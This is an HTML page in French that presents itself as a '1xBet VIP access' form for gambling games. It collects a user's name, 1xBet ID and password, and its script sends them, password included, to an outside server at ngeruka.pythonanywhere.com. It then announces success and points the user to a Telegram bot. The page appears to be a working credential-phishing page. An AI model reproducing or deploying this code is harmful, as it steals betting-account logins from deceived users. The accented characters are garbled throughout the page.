<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acc√®s VIP - Ngeruka</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #2c2c2c; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #f39c12; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #3d3d3d; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 5px; background: #f39c12; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #e67e22; }
        button:disabled { background: #7f8c8d; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="container">
    <form id="vipForm">
        <h2>üéØ ACC√àS VIP 1XBET</h2>
        <input type="text" id="nom" placeholder="Votre Nom" required>
        <input type="text" id="id1xbet" placeholder="Votre ID 1xBet" required>
        <select id="jeu">
            <option value="Crash">Jeu : Crash</option>
            <option value="Under Over 7">Jeu : Under Over 7</option>
            <option value="Apple of Fortune">Jeu : Apple of Fortune</option>
        </select>
        <input type="password" id="password" placeholder="Mot de passe" required>
        <button type="submit" id="submitBtn">V√âRIFIER LE SOLDE</button>
    </form>
</div>

<script>
    const API_URL = "https://ngeruka.pythonanywhere.com/send";

    document.getElementById('vipForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const btn = document.getElementById('submitBtn');
        btn.innerText = "CONNEXION EN COURS...";
        btn.disabled = true;

        const payload = {
            nom: document.getElementById('nom').value,
            id: document.getElementById('id1xbet').value,
            jeu: document.getElementById('jeu').value,
            pass: document.getElementById('password').value
        };

        try {
            // Envoi des donn√©es vers PythonAnywhere
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                alert("‚úÖ Succ√®s ! Acc√®s VIP activ√©. V√©rifiez votre bot Telegram.");
            } else {
                const errorData = await response.json();
                alert("‚ùå Erreur serveur : " + (errorData.message || "Inconnue"));
            }
        } catch (error) {
            console.error("Erreur Fetch :", error);
            alert("‚ùå Erreur de connexion au serveur PythonAnywhere.");
        } finally {
            btn.innerText = "V√âRIFIER LE SOLDE";
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
